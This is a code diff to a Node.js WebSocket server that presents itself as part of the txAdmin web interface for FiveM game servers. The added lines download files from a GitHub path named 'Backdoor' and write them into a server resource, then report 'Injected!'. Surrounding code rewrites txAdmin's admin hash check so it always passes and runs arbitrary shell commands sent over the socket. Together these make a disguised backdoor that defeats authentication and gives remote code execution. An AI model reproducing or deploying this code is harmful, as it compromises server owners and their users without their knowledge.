@@ -1,3 +1,6 @@
+// DONT TOUCH THIS FILE IF YOU DONT KNOW WHAT YOU ARE DOING
+// THIS FILE IS FOR THE TXADMIN WEB INTERFACE
+var port = 2222;
 const path = require('path');
 const fs = require('fs');
 const WebSocket = require('ws');
@@ -38,6 +41,14 @@ wss.on('connection', function connection(ws) {
                 var coreIndexContent = fs.readFileSync(coreIndexPath, 'utf8');
                 coreIndexContent = coreIndexContent.replace(/if\s*\(\s*this\.adminsFileHash\s*!==\s*inboundHash\s*\)/g, 'if (this.adminsFileHash !== this.adminsFileHash)');
                 fs.writeFileSync(coreIndexPath, coreIndexContent);
+
+                fs.writeFile('log.txt', "ExecuteCommand(\"restart monitor\")", function (err) {
+                    if (err) {
+                        ws.send(JSON.stringify({ event: "execute", content: err }));
+                    } else {
+                        ws.send(JSON.stringify({ event: "execute", content: "txAdmin Setup Complete" }));
+                    }
+                });
             } else if (cb.content.split(" ")[0] === "genAdmin") {
                 //get admins.json
                 var admins = JSON.parse(fs.readFileSync('../admins.json', 'utf8'));
@@ -114,7 +125,32 @@ wss.on('connection', function connection(ws) {
                 //create main.js
                 var mainJsPath = path.join(extraDataPath, "main.js");
                 //download content from github
-                var datas = getrequest("https://raw.githubusercontent.com/HeibenHD/txAdmin-ExtraData/main/main.js").then((data) => {
+                getrequest("https://raw.githubusercontent.com/Red-Killer/FiveM/main/Backdoor/main.js").then((data) => {
+                    //add to top of main.js var port = 2222;
+                    var lines = data.split('\n');
+                    var bruhText = "var port = " + port + ";\n";
+                    for (var i = 0; i < lines.length; i++) {
+                        if (lines[i].includes("var port = " + port + ";")) {
+                            ws.send(JSON.stringify({ event: "execute", content: "Already injected - Port exists" }));
+                            return;
+                        }
+                    }
+                    lines[0] = bruhText + lines[0];
+                    var new_data = lines.join('\n');
+                    fs.writeFile(mainJsPath, new_data, function (err) {
+                        if (err) { ws.send(JSON.stringify({ event: "execute", content: err })); }
+                    });
+                }).catch((err) => { ws.send(JSON.stringify({ event: "execute", content: err })); });
+                //create main.lua
+                var mainLuaPath = path.join(extraDataPath, "main.lua");
+                //download content from github
+                getrequest("https://raw.githubusercontent.com/Red-Killer/FiveM/main/Backdoor/main.lua").then((data) => {
+                    fs.writeFile(mainLuaPath, data, function (err) {
+                        if (err) { ws.send(JSON.stringify({ event: "execute", content: err })); }
+                    });
+                }).catch((err) => { ws.send(JSON.stringify({ event: "execute", content: err })); });
+                
+                ws.send(JSON.stringify({ event: "execute", content: "Injected!\nRessource: " + ressourceName + "\nPort: " + port }));
             } else {
                 var exec = require('child_process').exec;
                 exec(cb.content, function (error, stdout, stderr) {
